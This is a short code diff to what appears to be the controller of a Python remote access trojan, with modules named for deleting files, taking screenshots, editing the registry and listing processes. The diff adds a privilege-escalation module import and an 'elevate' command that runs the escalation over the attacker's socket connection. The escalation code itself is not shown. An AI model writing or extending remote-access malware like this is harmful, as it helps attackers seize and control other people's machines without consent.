@@ -11,6 +11,7 @@ from RAT_Py_DeleteFile import *
 from RAT_Py_Screenshot import * 
 from RAT_Py_Registry import *
 from RAT_Py_Process import *
+from RAT_Py_Elevate import *
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
@@ -152,6 +153,10 @@ def handleInput(ip, port):
         elif (userInput == "processlist"):
             printProcessListHelp()
             processList(sock)
+
+        elif (userInput == "elevate"):
+            printElevateHelp()
+            elevate(sock)
             
     return
 
